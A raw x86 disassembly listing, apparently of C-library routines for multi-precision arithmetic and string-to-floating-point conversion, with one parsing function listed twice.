xor edi, 0x1f
je 0x808d7e5
mov edx, dword [esi]
mov ecx, edi
shl ebx, cl
mov ecx, 0x20
sub ecx, edi
mov eax, edx
shr eax, cl
mov ecx, edi
or ebx, eax
shl edx, cl
mov dword [esi + 4], ebx
mov dword [esi], edx
mov eax, 0xffffc002
mov edx, dword [arg_10h]
sub eax, edi
mov dword [edx], eax
jmp 0x808d7a2
mov eax, dword [esi]
test eax, eax
je 0x808d813
bsr edi, eax
mov dword [esi], 0
xor edi, 0x1f
mov ecx, edi
shl eax, cl
mov dword [esi + 4], eax
mov eax, 0xffffbfe2
jmp 0x808d7ea
mov ecx, dword [arg_10h]
mov dword [esi + 4], 0x80000000
mov dword [ecx], 0xffffc002
jmp 0x808d7a2
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
and edx, 0x7fffffff
mov ebp, esp
sub esp, 4
mov eax, dword [arg_10h]
shl eax, 0x1f
or edx, eax
mov eax, dword [arg_ch]
and edx, 0x807fffff
add eax, 0x7f
and eax, 0xff
shl eax, 0x17
or edx, eax
mov eax, dword [arg_8h]
and edx, 0xff800000
mov eax, dword [eax]
and eax, 0x7fffff
or edx, eax
mov dword [var_4h], edx
fld dword [ebp - 4]
leave
ret
push edi
push esi
push ebp
push ebx
mov edi, dword [arg_14h]
mov esi, dword [arg_18h]
mov ecx, dword [arg_1ch]
mov ebx, dword [arg_20h]
lea edi, [edi + ecx*4]
lea esi, [esi + ecx*4]
neg ecx
xor ebp, ebp
mov esi, esi
mov eax, dword [esi + ecx*4]
mul ebx
add eax, ebp
adc edx, 0
sub dword [edi + ecx*4], eax
adc edx, 0
mov ebp, edx
inc ecx
jne 0x808d620
mov eax, ebp
pop ebx
pop ebp
pop esi
pop edi
ret
push edi
push esi
mov edi, dword [arg_ch]
mov esi, dword [arg_10h]
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov eax, ecx
shr ecx, 3
neg eax
and eax, 7
je 0x808c2d8
inc ecx
shl eax, 2
sub edi, eax
sub esi, eax
sub edx, eax
shr eax, 2
lea eax, [eax + eax*8 + 0x808c2d5]
jmp eax
lea esi, [esi]
mov eax, dword [esi]
adc eax, dword [edx]
mov dword [edi], eax
mov eax, dword [esi + 4]
adc eax, dword [edx + 4]
mov dword [edi + 4], eax
mov eax, dword [esi + 8]
adc eax, dword [edx + 8]
mov dword [edi + 8], eax
mov eax, dword [esi + 0xc]
adc eax, dword [edx + 0xc]
mov dword [edi + 0xc], eax
mov eax, dword [esi + 0x10]
adc eax, dword [edx + 0x10]
mov dword [edi + 0x10], eax
mov eax, dword [esi + 0x14]
adc eax, dword [edx + 0x14]
mov dword [edi + 0x14], eax
mov eax, dword [esi + 0x18]
adc eax, dword [edx + 0x18]
mov dword [edi + 0x18], eax
mov eax, dword [esi + 0x1c]
adc eax, dword [edx + 0x1c]
mov dword [edi + 0x1c], eax
lea edi, [edi + 0x20]
lea esi, [esi + 0x20]
lea edx, [edx + 0x20]
dec ecx
jne 0x808c2d8
sbb eax, eax
neg eax
pop esi
pop edi
ret
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
xor esi, esi
push ebx
sub esp, 0x18
mov eax, dword [arg_14h]
mov ebx, dword [arg_8h]
mov dword [eax], 0
lea esi, [esi]
cmp edi, 9
je 0x8088080
movzx ecx, byte [ebx]
lea eax, [ecx - 0x30]
cmp al, 9
jbe 0x8087f4b
mov eax, dword [arg_24h]
test eax, eax
je 0x8087f45
mov eax, dword [arg_24h]
cmp cl, byte [eax]
je 0x8088040
add ebx, dword [arg_20h]
movzx ecx, byte [ebx]
movsx eax, cl
dec dword [arg_ch]
lea edx, [esi + esi*4]
lea esi, [eax + edx*2 - 0x30]
inc ebx
inc edi
mov eax, dword [arg_ch]
test eax, eax
jg 0x8087f20
mov edx, dword [arg_18h]
mov eax, dword [edx]
test eax, eax
jle 0x8088033
lea edx, [eax + edi]
cmp edx, 9
jg 0x8088033
imul esi, dword [eax*4 + 0x80a6120]
mov ecx, dword [arg_18h]
mov edx, dword [edx*4 + 0x80a6120]
mov dword [ecx], 0
mov ecx, dword [arg_14h]
mov eax, dword [ecx]
test eax, eax
jne 0x8087fb0
mov eax, dword [arg_10h]
mov dword [eax], esi
mov dword [ecx], 1
add esp, 0x18
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], edx
mov dword [var_8h], eax
mov edx, dword [arg_10h]
mov dword [var_4h], edx
mov dword [esp], edx
call fcn.0808cae0
mov dword [var_14h], eax
mov edi, dword [arg_10h]
mov eax, dword [arg_14h]
mov ecx, dword [eax]
add edi, 4
mov eax, dword [arg_10h]
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x8088019
dec ecx
je 0x8087ffd
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x8088019
dec ecx
jne 0x8087feb
mov eax, 1
add dword [var_14h], eax
je 0x8087fa6
mov edx, dword [arg_14h]
mov esi, dword [var_14h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x8087fa6
cmp esi, edi
je 0x808802f
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808802f
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x8088024
xor eax, eax
jmp 0x8088002
mov edx, dword [edi*4 + 0x80a6120]
jmp 0x8087f92
nop
movzx eax, byte [eax + 1]
mov edx, 1
test al, al
je 0x8088070
lea esi, [esi]
cmp al, byte [edx + ebx]
jne 0x8088061
mov ecx, dword [arg_24h]
inc edx
movzx eax, byte [edx + ecx]
test al, al
jne 0x8088050
test al, al
jne 0x8087f45
add ebx, edx
jmp 0x8087f48
mov ecx, dword [arg_24h]
movzx eax, byte [ecx + 1]
jmp 0x8088061
lea esi, [esi]
mov edx, dword [arg_14h]
mov eax, dword [edx]
test eax, eax
jne 0x808809d
mov ecx, dword [arg_10h]
mov dword [ecx], esi
mov dword [edx], 1
xor edi, edi
xor esi, esi
jmp 0x8087f29
mov dword [var_8h], eax
mov dword [var_ch], 0x3b9aca00
mov eax, dword [arg_10h]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808cae0
mov dword [var_10h], eax
mov edx, dword [arg_14h]
mov edi, dword [arg_10h]
mov eax, dword [arg_10h]
mov ecx, dword [edx]
add edi, 4
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x808810e
dec ecx
je 0x80880f2
lea esi, [esi]
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x808810e
dec ecx
jne 0x80880e0
mov eax, 1
add dword [var_10h], eax
je 0x8088094
mov edx, dword [arg_14h]
mov esi, dword [var_10h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x8088094
cmp esi, edi
je 0x808812b
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808812b
lea esi, [esi]
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x8088120
xor eax, eax
jmp 0x80880f7
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x20
mov esi, dword [arg_1ch]
mov ecx, dword [arg_14h]
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov edi, dword [arg_8h]
mov dword [var_18h], ecx
mov dword [var_10h], eax
mov dword [var_14h], edx
cmp dword [var_10h], 0xfffffc02
mov eax, dword [arg_18h]
mov dword [var_1ch], eax
jge 0x8087d66
mov ebx, 0xfffffc02
sub ebx, dword [var_10h]
cmp ebx, 0x35
jg 0x8087eeb
movzx ecx, byte [var_1ch]
mov eax, 1
mov edx, esi
or edx, 1
shl eax, cl
dec eax
test dword [var_18h], eax
cmovne esi, edx
cmp ebx, 0x35
je 0x8087eb7
cmp ebx, 0x1f
jle 0x8087e87
mov ecx, ebx
lea eax, [ebx + 0x1e]
dec ecx
cmovns eax, ecx
sar eax, 5
mov edx, dword [edi + eax*4]
shl eax, 5
mov dword [var_18h], edx
mov edx, ecx
sub edx, eax
mov dword [var_1ch], edx
xor edx, edx
lea esi, [esi]
cmp ecx, 0xffffffff
lea eax, [ebx + 0x1e]
cmovg eax, ecx
sar eax, 5
cmp edx, eax
jge 0x8087cef
mov eax, esi
or eax, 1
cmp dword [edi + edx*4], 0
cmovne esi, eax
inc edx
jmp 0x8087cd0
movzx ecx, byte [var_1ch]
mov eax, 1
mov edx, esi
or edx, 1
shl eax, cl
mov ecx, ebx
dec eax
test dword [var_18h], eax
mov dword [esp], edi
cmovne esi, edx
cmp ebx, 0xffffffff
lea edx, [ebx + 0x1f]
cmovg edx, ebx
sar edx, 5
mov eax, edx
shl eax, 5
sub ecx, eax
mov eax, 2
sub eax, edx
mov dword [var_sp_ch], ecx
lea edx, [edi + edx*4]
mov dword [var_sp_4h], edx
mov dword [var_sp_8h], eax
call fcn.0808c750
xor edx, edx
nop
lea esi, [esi]
cmp ebx, 0xffffffff
lea eax, [ebx + 0x1f]
cmovg eax, ebx
sar eax, 5
cmp edx, eax
jge 0x8087d5f
mov ecx, edx
inc edx
sub ecx, eax
mov dword [edi + ecx*4 + 8], 0
jmp 0x8087d40
mov dword [var_10h], 0xfffffc01
movzx ecx, byte [var_1ch]
mov eax, dword [var_18h]
shr eax, cl
test al, 1
je 0x8087dd3
test esi, esi
jne 0x8087e80
mov edx, dword [edi]
test dl, 1
jne 0x8087d90
mov eax, 1
shl eax, cl
dec eax
test dword [var_18h], eax
je 0x8087dd3
nop
lea eax, [edx + 1]
lea ebx, [edi + 4]
mov esi, 2
cmp eax, edx
mov dword [edi], eax
mov ecx, ebx
jae 0x8087e59
mov eax, dword [edi + 4]
lea ebx, [edi + 8]
mov esi, 1
mov ecx, ebx
inc eax
test eax, eax
mov dword [edi + 4], eax
jne 0x8087e59
mov eax, dword [edi + 4]
test eax, 0x200000
jne 0x8087e2e
cmp dword [var_10h], 0xfffffc01
je 0x8087e1b
cmp dword [var_10h], 0x400
jle 0x8087e00
mov eax, dword [var_14h]
test eax, eax
je 0x8087df1
fld dword [0x80a6100]
add esp, 0x20
pop ebx
pop esi
pop edi
leave
ret
fld dword [0x80a61a0]
jmp 0x8087de9
lea esi, [esi]
mov eax, dword [var_14h]
mov edx, dword [var_10h]
mov dword [arg_8h], edi
mov dword [arg_10h], eax
mov dword [arg_ch], edx
add esp, 0x20
pop ebx
pop esi
pop edi
leave
jmp 0x808d880
test eax, 0x100000
mov eax, 0xfffffc02
cmove eax, dword [var_10h]
mov dword [var_10h], eax
jmp 0x8087dd3
inc dword [var_10h]
mov dword [esp], edi
mov dword [var_sp_4h], edi
mov dword [var_sp_ch], 1
mov dword [var_sp_8h], 2
call fcn.0808c750
or dword [edi + 4], 0x100000
jmp 0x8087dd3
cmp ecx, ebx
je 0x8087dc0
xor edx, edx
dec esi
cmp edx, esi
jge 0x8087dc0
lea esi, [esi]
mov eax, dword [ebx + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, esi
jl 0x8087e70
jmp 0x8087dc0
mov edx, dword [edi]
jmp 0x8087d90
test ebx, ebx
jle 0x8087d5f
mov eax, dword [edi]
lea edx, [ebx - 1]
mov dword [var_1ch], edx
mov dword [var_18h], eax
mov dword [esp], edi
mov dword [var_sp_4h], edi
mov dword [var_sp_ch], ebx
mov dword [var_sp_8h], 2
call fcn.0808c750
jmp 0x8087d5f
mov eax, dword [edi + 4]
mov dword [var_1ch], 0x14
xor edx, edx
mov dword [var_18h], eax
mov ecx, dword [edi + edx*4]
mov eax, esi
or eax, 1
test ecx, ecx
cmovne esi, eax
inc edx
cmp edx, 1
jle 0x8087ec6
mov dword [edi], 0
mov dword [edi + 4], 0
jmp 0x8087d5f
call fcn.08048b20
fldz
mov dword [eax], 0x21
jmp 0x8087de9
lea esi, [esi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
xor esi, esi
push ebx
sub esp, 0x18
mov eax, dword [arg_14h]
mov ebx, dword [arg_8h]
mov dword [eax], 0
lea esi, [esi]
cmp edi, 9
je 0x8088080
movzx ecx, byte [ebx]
lea eax, [ecx - 0x30]
cmp al, 9
jbe 0x8087f4b
mov eax, dword [arg_24h]
test eax, eax
je 0x8087f45
mov eax, dword [arg_24h]
cmp cl, byte [eax]
je 0x8088040
add ebx, dword [arg_20h]
movzx ecx, byte [ebx]
movsx eax, cl
dec dword [arg_ch]
lea edx, [esi + esi*4]
lea esi, [eax + edx*2 - 0x30]
inc ebx
inc edi
mov eax, dword [arg_ch]
test eax, eax
jg 0x8087f20
mov edx, dword [arg_18h]
mov eax, dword [edx]
test eax, eax
jle 0x8088033
lea edx, [eax + edi]
cmp edx, 9
jg 0x8088033
imul esi, dword [eax*4 + 0x80a6120]
mov ecx, dword [arg_18h]
mov edx, dword [edx*4 + 0x80a6120]
mov dword [ecx], 0
mov ecx, dword [arg_14h]
mov eax, dword [ecx]
test eax, eax
jne 0x8087fb0
mov eax, dword [arg_10h]
mov dword [eax], esi
mov dword [ecx], 1
add esp, 0x18
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], edx
mov dword [var_8h], eax
mov edx, dword [arg_10h]
mov dword [var_4h], edx
mov dword [esp], edx
call fcn.0808cae0
mov dword [var_14h], eax
mov edi, dword [arg_10h]
mov eax, dword [arg_14h]
mov ecx, dword [eax]
add edi, 4
mov eax, dword [arg_10h]
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x8088019
dec ecx
je 0x8087ffd
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x8088019
dec ecx
jne 0x8087feb
mov eax, 1
add dword [var_14h], eax
je 0x8087fa6
mov edx, dword [arg_14h]
mov esi, dword [var_14h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x8087fa6
cmp esi, edi
je 0x808802f
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808802f
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x8088024
xor eax, eax
jmp 0x8088002
mov edx, dword [edi*4 + 0x80a6120]
jmp 0x8087f92
nop
movzx eax, byte [eax + 1]
mov edx, 1
test al, al
je 0x8088070
lea esi, [esi]
cmp al, byte [edx + ebx]
jne 0x8088061
mov ecx, dword [arg_24h]
inc edx
movzx eax, byte [edx + ecx]
test al, al
jne 0x8088050
test al, al
jne 0x8087f45
add ebx, edx
jmp 0x8087f48
mov ecx, dword [arg_24h]
movzx eax, byte [ecx + 1]
jmp 0x8088061
lea esi, [esi]
mov edx, dword [arg_14h]
mov eax, dword [edx]
test eax, eax
jne 0x808809d
mov ecx, dword [arg_10h]
mov dword [ecx], esi
mov dword [edx], 1
xor edi, edi
xor esi, esi
jmp 0x8087f29
mov dword [var_8h], eax
mov dword [var_ch], 0x3b9aca00
mov eax, dword [arg_10h]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808cae0
mov dword [var_10h], eax
mov edx, dword [arg_14h]
mov edi, dword [arg_10h]
mov eax, dword [arg_10h]
mov ecx, dword [edx]
add edi, 4
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x808810e
dec ecx
je 0x80880f2
lea esi, [esi]
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x808810e
dec ecx
jne 0x80880e0
mov eax, 1
add dword [var_10h], eax
je 0x8088094
mov edx, dword [arg_14h]
mov esi, dword [var_10h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x8088094
cmp esi, edi
je 0x808812b
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808812b
lea esi, [esi]
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x8088120
xor eax, eax
jmp 0x80880f7
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x22c
mov ecx, dword [arg_10h]
mov eax, dword [arg_14h]
mov dword [var_168h], 0xa
mov dword [var_190h], 0
test ecx, ecx
mov edx, dword [eax + 4]
je 0x8088189
mov ecx, dword [edx + 0x2c]
mov dword [var_194h], ecx
movzx eax, byte [ecx]
test al, al
jle 0x8088189
cmp al, 0x7f
je 0x8088189
mov esi, dword [edx + 0x28]
mov dword [var_190h], esi
cmp byte [esi], 0
jne 0x8088193
mov dword [var_190h], 0
mov dword [var_194h], 0
mov edx, dword [edx + 0x24]
mov dword [var_18ch], edx
mov dword [esp], edx
call fcn.08053400
mov edi, dword [arg_8h]
mov dword [var_170h], 0
mov dword [var_198h], eax
mov dword [var_15ch], 0
mov dword [var_164h], 0
mov eax, dword [arg_14h]
dec edi
mov edx, dword [eax + 0x34]
inc edi
movzx esi, byte [edi]
mov ecx, esi
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x80881d2
cmp cl, 0x2d
je 0x8089f3c
cmp cl, 0x2b
je 0x8089f33
mov edx, dword [var_18ch]
xor ebx, ebx
movzx edx, byte [edx]
test dl, dl
mov byte [var_206h], dl
mov byte [var_205h], dl
je 0x8089f28
mov eax, edx
cmp byte [ebx + edi], al
jne 0x8089f1b
mov ecx, dword [var_18ch]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x8088215
movzx eax, byte [ebx + edi]
cmp al, 0x2f
jle 0x808823d
cmp al, 0x39
jle 0x808840a
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808840a
mov ecx, esi
mov esi, dword [arg_14h]
movsx eax, cl
mov ebx, eax
mov ecx, dword [esi + 0x38]
cmp dword [ecx + eax*4], 0x69
je 0x808838c
cmp dword [ecx + ebx*4], 0x6e
jne 0x8088376
mov ecx, dword [arg_14h]
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fb8
mov dword [esp], edi
mov dword [var_ch], ecx
call fcn.0808dd40
test eax, eax
jne 0x8088376
fld dword [0x80a61a4]
add edi, 3
fstp qword [ebp - 0x1a0]
cmp byte [edi], 0x28
je 0x80882c1
mov eax, dword [arg_ch]
test eax, eax
je 0x80882b0
mov eax, dword [arg_ch]
mov dword [eax], edi
fld qword [ebp - 0x1a0]
add esp, 0x22c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_14h]
mov ebx, edi
mov ecx, dword [eax + 0x38]
inc edi
movzx edx, byte [edi]
lea eax, [edx - 0x30]
cmp al, 9
jbe 0x80882c9
movsx eax, dl
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jle 0x80882e4
cmp eax, 0x7a
jle 0x80882c9
cmp dl, 0x5f
je 0x80882c9
cmp dl, 0x29
je 0x80882f2
mov edi, ebx
jmp 0x80882a4
mov edx, dword [arg_14h]
lea eax, [var_150h]
mov dword [var_ch], 0
mov dword [var_4h], eax
mov dword [var_8h], 0
lea eax, [ebx + 1]
mov dword [esp], eax
mov dword [var_10h], edx
call fcn.080856c0
cmp dword [var_150h], edi
mov ecx, eax
mov ebx, edx
jne 0x80882a4
fld qword [ebp - 0x1a0]
and edx, 0xfffff
mov esi, edx
or esi, eax
fstp qword [ebp - 0x1a8]
jne 0x808834d
xor ecx, ecx
mov ebx, 0x80000
mov eax, ebx
mov dword [var_1a8h], ecx
and eax, 0xfffff
or eax, 0x7ff00000
mov dword [var_1a4h], eax
fld qword [ebp - 0x1a8]
fstp qword [ebp - 0x1a0]
jmp 0x80882a4
mov eax, dword [arg_ch]
test eax, eax
je 0x8088385
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
mov dword [edx], ecx
fldz
jmp 0x80882b6
mov dword [var_ch], esi
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fc0
mov dword [esp], edi
call fcn.0808dd40
test eax, eax
jne 0x80883ff
mov eax, dword [arg_ch]
test eax, eax
je 0x80883df
lea ebx, [edi + 3]
mov dword [var_ch], esi
mov dword [var_8h], 5
mov dword [esp], ebx
mov dword [var_4h], str.inity
call fcn.0808dd40
test eax, eax
lea edx, [edi + 8]
mov eax, dword [arg_ch]
cmove ebx, edx
mov dword [eax], ebx
mov edx, dword [var_164h]
test edx, edx
je 0x80883f4
fld dword [0x80a6100]
jmp 0x80882b6
fld dword [0x80a61a0]
jmp 0x80882b6
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
jmp 0x808825f
mov eax, esi
cmp al, 0x30
je 0x8089ee8
mov eax, dword [var_190h]
mov dword [var_178h], edi
test eax, eax
je 0x8089ece
mov ecx, dword [var_190h]
movzx edx, byte [ecx]
mov eax, esi
cmp al, 0x30
je 0x8088465
xor ebx, ebx
test dl, dl
je 0x8089ec0
mov ecx, dword [var_190h]
movzx eax, byte [ecx]
lea esi, [esi]
mov ecx, esi
cmp cl, al
jne 0x808846b
mov ecx, dword [var_190h]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x8088450
inc edi
movzx esi, byte [edi]
jmp 0x8088431
test al, al
je 0x8088465
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8088483
cmp dword [var_168h], 0x10
je 0x8089e6b
mov dword [var_174h], edi
mov dword [var_180h], 0
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8089e60
cmp dword [var_168h], 0x10
je 0x8089e3e
mov eax, dword [var_190h]
test eax, eax
je 0x80884ea
mov ecx, dword [var_190h]
xor ebx, ebx
movzx eax, byte [ecx]
test al, al
je 0x8089e30
cmp al, byte [ebx + edi]
jne 0x80884e6
mov edx, dword [var_190h]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x80884c8
lea esi, [esi]
inc edi
movzx esi, byte [edi]
jmp 0x8088493
test al, al
je 0x80884e0
mov eax, dword [var_194h]
test eax, eax
je 0x8089aa5
mov ebx, dword [var_180h]
test ebx, ebx
jle 0x8089aa5
mov ecx, dword [var_178h]
mov eax, dword [var_194h]
mov dword [var_4h], edi
mov edx, dword [var_190h]
mov dword [esp], ecx
mov dword [var_ch], eax
mov dword [var_8h], edx
call fcn.08049980
cmp edi, eax
mov ecx, eax
je 0x8089a96
cmp eax, dword [var_178h]
je 0x8089a7e
cmp eax, dword [var_174h]
jb 0x8089a6e
mov ecx, dword [var_174h]
mov edi, eax
mov dword [var_180h], 0
cmp ecx, eax
jae 0x8088585
movzx eax, byte [ecx]
mov edx, dword [var_180h]
inc edx
sub eax, 0x30
cmp al, 9
cmova edx, dword [var_180h]
inc ecx
cmp ecx, edi
mov dword [var_180h], edx
jb 0x8088564
mov ecx, dword [var_180h]
mov dword [var_188h], 0
mov dword [var_184h], ecx
mov edx, dword [arg_ch]
test edx, edx
je 0x80885a7
mov edx, dword [arg_ch]
mov dword [edx], edi
mov eax, dword [var_180h]
test eax, eax
jne 0x80885ca
mov eax, dword [var_164h]
test eax, eax
je 0x8088385
fld dword [0x80a6104]
jmp 0x80882b6
mov eax, dword [var_188h]
test eax, eax
je 0x808867c
mov ecx, dword [var_18ch]
mov esi, dword [var_18ch]
movzx ecx, byte [ecx]
mov byte [var_206h], cl
movzx edx, byte [esi + 1]
mov ecx, dword [var_174h]
movzx eax, byte [var_206h]
cmp byte [ecx], al
je 0x808860a
inc dword [var_174h]
jmp 0x80885f1
test dl, dl
mov ebx, 1
je 0x8089a62
mov esi, dword [var_18ch]
movzx eax, byte [esi + 1]
mov ecx, dword [var_174h]
cmp al, byte [ebx + ecx]
jne 0x8089a55
mov esi, dword [var_18ch]
inc ebx
movzx eax, byte [ebx + esi]
test al, al
jne 0x8088621
mov eax, dword [var_188h]
add eax, dword [var_198h]
add dword [var_174h], eax
cmp dword [var_168h], 0x10
je 0x8089a3f
mov edx, dword [var_15ch]
sub edx, dword [var_188h]
mov esi, dword [var_188h]
mov dword [var_15ch], edx
sub dword [var_180h], esi
cmp dword [var_168h], 0x10
je 0x8089827
mov ebx, dword [var_15ch]
test ebx, ebx
mov edx, ebx
js 0x808980e
mov eax, dword [var_180h]
sub eax, dword [var_184h]
cmp ebx, eax
cmovle eax, ebx
add dword [var_184h], eax
mov ebx, edx
sub ebx, eax
mov eax, dword [var_184h]
mov dword [var_15ch], ebx
add eax, ebx
cmp eax, 0x135
jg 0x8088854
cmp ebx, 0xfffffebd
jl 0x80897fe
mov ecx, dword [var_184h]
test ecx, ecx
jle 0x8088a15
mov esi, dword [var_18ch]
mov edx, dword [var_190h]
lea eax, [var_15ch]
mov ecx, dword [var_198h]
mov dword [var_10h], eax
mov eax, dword [var_174h]
mov dword [var_14h], esi
mov dword [var_1ch], edx
mov esi, dword [var_184h]
mov dword [var_18h], ecx
lea edx, [var_160h]
mov dword [esp], eax
lea ecx, [var_ach]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], esi
call fcn.08087f00
mov ebx, dword [var_15ch]
mov dword [var_174h], eax
test ebx, ebx
jle 0x8088829
lea edx, [var_ach]
lea ecx, [var_14ch]
mov edi, 1
mov dword [var_1b4h], edx
mov dword [var_1b8h], ecx
mov dword [var_1bch], 0x80a7020
test edi, ebx
je 0x8088806
mov eax, dword [var_1bch]
mov edx, dword [var_160h]
xor ebx, edi
mov dword [var_15ch], ebx
mov esi, dword [eax + 4]
sub esi, 2
cmp edx, esi
jl 0x80897cf
mov dword [var_10h], esi
mov eax, dword [eax]
mov dword [var_8h], edx
mov edx, dword [var_1b8h]
lea eax, [eax*4 + 0x80a6248]
mov dword [var_ch], eax
mov dword [esp], edx
mov eax, dword [var_1b4h]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edx, eax
mov eax, dword [var_160h]
add eax, esi
test edx, edx
mov dword [var_160h], eax
jne 0x80887e8
dec eax
mov dword [var_160h], eax
mov eax, dword [var_1b4h]
mov esi, dword [var_1b8h]
mov ebx, dword [var_15ch]
mov dword [var_1b4h], esi
mov dword [var_1b8h], eax
add edi, edi
add dword [var_1bch], 0x10
test ebx, ebx
jne 0x8088776
lea eax, [var_14ch]
cmp dword [var_1b4h], eax
je 0x80897b3
mov edx, dword [var_160h]
bsr ecx, dword [ebp + edx*4 - 0xb0]
xor ecx, 0x1f
mov eax, edx
mov dword [var_1c0h], edx
shl eax, 5
sub eax, ecx
cmp eax, 0x400
mov dword [var_170h], eax
jle 0x8088864
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x80883df
cmp dword [var_170h], 0x35
jle 0x80889d9
mov edx, dword [var_170h]
mov eax, dword [var_170h]
mov dword [var_1c8h], 0x1f
sub edx, 0x16
sub eax, 0x35
mov esi, eax
mov edi, eax
cmovs esi, edx
sar esi, 5
mov edx, esi
lea ecx, [esi - 1]
shl edx, 5
sub edi, edx
cmovne ecx, esi
lea eax, [edi - 1]
test edi, edi
cmove eax, dword [var_1c8h]
mov dword [var_1c4h], ecx
mov dword [var_1c8h], eax
jne 0x8088958
mov eax, dword [ebp + esi*4 - 0xac]
mov dword [var_158h], eax
mov eax, dword [ebp + esi*4 - 0xa8]
mov dword [var_154h], eax
mov eax, dword [var_ach]
xor ebx, ebx
test eax, eax
jne 0x80888f4
inc ebx
mov eax, dword [ebp + ebx*4 - 0xac]
test eax, eax
je 0x80888e8
xor eax, eax
mov esi, dword [var_180h]
cmp dword [var_184h], esi
jl 0x808890c
cmp ebx, dword [var_1c4h]
jge 0x8088911
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_1c4h]
mov ecx, dword [var_164h]
mov eax, dword [var_1c8h]
mov dword [var_8h], ecx
mov dword [var_10h], eax
mov eax, dword [ebp + edx*4 - 0xac]
mov dword [var_ch], eax
mov eax, dword [var_170h]
dec eax
lea esi, [var_158h]
mov dword [var_4h], eax
mov dword [esp], esi
call fcn.08087c40
jmp 0x80882b6
mov eax, dword [var_1c0h]
mov ebx, esi
dec eax
cmp esi, eax
jge 0x80889be
mov dword [var_1cch], eax
mov dword [var_1d0h], 0x20
lea eax, [var_158h]
sub dword [var_1d0h], edi
mov dword [var_218h], eax
mov edx, dword [ebp + ebx*4 - 0xac]
mov ecx, edi
mov eax, dword [ebp + ebx*4 - 0xa8]
inc ebx
shr edx, cl
movzx ecx, byte [var_1d0h]
shl eax, cl
or edx, eax
mov eax, dword [var_218h]
mov dword [eax], edx
add eax, 4
cmp ebx, dword [var_1cch]
mov dword [var_218h], eax
jl 0x8088987
mov eax, ebx
sub eax, esi
dec eax
jg 0x80888dc
mov eax, dword [ebp + ebx*4 - 0xac]
mov ecx, edi
shr eax, cl
jmp 0x80888d6
mov eax, dword [var_184h]
cmp dword [var_180h], eax
je 0x8089640
mov ecx, dword [var_1c0h]
lea esi, [var_ach]
lea edi, [var_158h]
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_160h]
cmp eax, 1
jle 0x8089630
mov esi, 0x37
lea edx, [var_14ch]
lea ecx, [var_ach]
sub esi, dword [var_170h]
mov dword [var_1e0h], edx
mov dword [var_1e4h], ecx
mov edx, 0x55555556
mov ecx, dword [var_180h]
mov dword [var_1e8h], 0x80a7020
sub ecx, dword [var_184h]
mov dword [var_1dch], 0
mov eax, esi
imul edx
mov eax, esi
sar eax, 0x1f
sub edx, eax
lea eax, [edx + 2]
cmp ecx, eax
jle 0x8088a89
mov ecx, dword [var_184h]
mov dword [var_1dch], 1
lea edx, [edx + ecx + 2]
